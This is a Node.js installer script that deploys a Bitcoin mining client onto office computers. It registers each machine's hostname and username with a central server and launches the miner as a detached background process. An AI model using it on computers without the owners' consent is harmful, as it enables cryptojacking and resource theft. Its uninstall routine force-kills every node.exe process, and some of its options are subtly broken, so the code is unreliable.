const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');

class OfficeMiningInstaller {
    constructor() {
        this.config = {
            centralServer: 'http://your-host-computer:3000', // Your main computer
            installationPath: this.getInstallationPath(),
            autoStart: true,
            silentMode: false
        };
    }

    /**
     * Get appropriate installation path based on OS
     */
    getInstallationPath() {
        const platform = os.platform();
        const username = os.userInfo().username;
        
        switch (platform) {
            case 'win32':
                return `C:\\Users\\${username}\\AppData\\Local\\BitcoinMiner`;
            case 'darwin':
                return `/Users/${username}/Library/Application Support/BitcoinMiner`;
            case 'linux':
                return `/home/${username}/.bitcoin-miner`;
            default:
                return path.join(os.homedir(), '.bitcoin-miner');
        }
    }

    /**
     * Install mining client on this computer
     */
    async install() {
        try {
            console.log('🚀 Installing Bitcoin Mining Client...');
            
            // Create installation directory
            this.createInstallationDirectory();
            
            // Copy mining files
            this.copyMiningFiles();
            
            // Install dependencies
            await this.installDependencies();
            
            // Create startup script
            this.createStartupScript();
            
            // Register with central server
            await this.registerWithCentralServer();
            
            // Start mining client
            if (this.config.autoStart) {
                await this.startMiningClient();
            }
            
            console.log('✅ Installation completed successfully!');
            console.log(`📁 Installed to: ${this.config.installationPath}`);
            console.log(`🌐 Central server: ${this.config.centralServer}`);
            
        } catch (error) {
            console.error('❌ Installation failed:', error.message);
            throw error;
        }
    }

    /**
     * Create installation directory
     */
    createInstallationDirectory() {
        if (!fs.existsSync(this.config.installationPath)) {
            fs.mkdirSync(this.config.installationPath, { recursive: true });
            console.log('📁 Created installation directory');
        }
    }

    /**
     * Copy mining client files
     */
    copyMiningFiles() {
        const filesToCopy = [
            'package.json',
            'src/client/mining-client.js',
            'src/client/config.js',
            'src/utils/SystemMonitor.js'
        ];

        filesToCopy.forEach(file => {
            const sourcePath = path.join(__dirname, '../../', file);
            const destPath = path.join(this.config.installationPath, file);
            
            if (fs.existsSync(sourcePath)) {
                const destDir = path.dirname(destPath);
                if (!fs.existsSync(destDir)) {
                    fs.mkdirSync(destDir, { recursive: true });
                }
                
                fs.copyFileSync(sourcePath, destPath);
                console.log(`📄 Copied ${file}`);
            }
        });
    }

    /**
     * Install Node.js dependencies
     */
    async installDependencies() {
        return new Promise((resolve, reject) => {
            const packageJsonPath = path.join(this.config.installationPath, 'package.json');
            
            if (!fs.existsSync(packageJsonPath)) {
                // Create minimal package.json for client
                const clientPackageJson = {
                    name: 'bitcoin-mining-client',
                    version: '1.0.0',
                    main: 'src/client/mining-client.js',
                    dependencies: {
                        'systeminformation': '^5.21.15',
                        'axios': '^1.6.0',
                        'ws': '^8.14.2'
                    }
                };
                
                fs.writeFileSync(packageJsonPath, JSON.stringify(clientPackageJson, null, 2));
            }

            exec('npm install', { 
                cwd: this.config.installationPath,
                stdio: this.config.silentMode ? 'ignore' : 'inherit'
            }, (error, stdout, stderr) => {
                if (error) {
                    reject(error);
                } else {
                    console.log('📦 Dependencies installed');
                    resolve();
                }
            });
        });
    }

    /**
     * Create startup script
     */
    createStartupScript() {
        const platform = os.platform();
        let scriptContent = '';
        let scriptName = '';

        switch (platform) {
            case 'win32':
                scriptName = 'start-mining.bat';
                scriptContent = `@echo off
cd /d "${this.config.installationPath}"
node src/client/mining-client.js
pause`;
                break;
            case 'darwin':
            case 'linux':
                scriptName = 'start-mining.sh';
                scriptContent = `#!/bin/bash
cd "${this.config.installationPath}"
node src/client/mining-client.js`;
                break;
        }

        const scriptPath = path.join(this.config.installationPath, scriptName);
        fs.writeFileSync(scriptPath, scriptContent);
        
        // Make executable on Unix systems
        if (platform !== 'win32') {
            fs.chmodSync(scriptPath, '755');
        }

        console.log(`📝 Created startup script: ${scriptName}`);
    }

    /**
     * Register this computer with central server
     */
    async registerWithCentralServer() {
        const computerInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpu: os.cpus().length,
            memory: Math.round(os.totalmem() / 1024 / 1024 / 1024), // GB
            username: os.userInfo().username,
            installPath: this.config.installationPath,
            timestamp: new Date().toISOString()
        };

        try {
            const axios = require('axios');
            await axios.post(`${this.config.centralServer}/api/register-client`, computerInfo);
            console.log('🌐 Registered with central server');
        } catch (error) {
            console.warn('⚠️ Failed to register with central server:', error.message);
        }
    }

    /**
     * Start the mining client
     */
    async startMiningClient() {
        const clientPath = path.join(this.config.installationPath, 'src/client/mining-client.js');
        
        if (fs.existsSync(clientPath)) {
            console.log('🚀 Starting mining client...');
            
            const child = exec(`node "${clientPath}"`, {
                cwd: this.config.installationPath,
                detached: true,
                stdio: 'ignore'
            });
            
            child.unref(); // Allow parent to exit
            console.log('✅ Mining client started in background');
        } else {
            console.warn('⚠️ Mining client file not found');
        }
    }

    /**
     * Create desktop shortcut (Windows)
     */
    createDesktopShortcut() {
        if (os.platform() === 'win32') {
            const shortcutPath = path.join(os.homedir(), 'Desktop', 'Bitcoin Miner.lnk');
            // In a real implementation, you'd use a library like 'node-windows-shortcut'
            console.log('🔗 Desktop shortcut would be created here:', shortcutPath);
        }
    }

    /**
     * Uninstall mining client
     */
    async uninstall() {
        try {
            console.log('🗑️ Uninstalling Bitcoin Mining Client...');
            
            // Stop mining client
            await this.stopMiningClient();
            
            // Remove installation directory
            if (fs.existsSync(this.config.installationPath)) {
                fs.rmSync(this.config.installationPath, { recursive: true, force: true });
                console.log('📁 Removed installation directory');
            }
            
            // Unregister from central server
            await this.unregisterFromCentralServer();
            
            console.log('✅ Uninstallation completed');
            
        } catch (error) {
            console.error('❌ Uninstallation failed:', error.message);
            throw error;
        }
    }

    /**
     * Stop mining client
     */
    async stopMiningClient() {
        return new Promise((resolve) => {
            exec('taskkill /F /IM node.exe', (error) => {
                // Ignore errors - process might not be running
                console.log('🛑 Mining client stopped');
                resolve();
            });
        });
    }

    /**
     * Unregister from central server
     */
    async unregisterFromCentralServer() {
        try {
            const axios = require('axios');
            await axios.post(`${this.config.centralServer}/api/unregister-client`, {
                hostname: os.hostname()
            });
            console.log('🌐 Unregistered from central server');
        } catch (error) {
            console.warn('⚠️ Failed to unregister from central server:', error.message);
        }
    }
}

// CLI interface
if (require.main === module) {
    const installer = new OfficeMiningInstaller();
    const command = process.argv[2];
    
    switch (command) {
        case 'install':
            installer.install().catch(console.error);
            break;
        case 'uninstall':
            installer.uninstall().catch(console.error);
            break;
        default:
            console.log('Usage: node office-installer.js [install|uninstall]');
            break;
    }
}

module.exports = OfficeMiningInstaller;




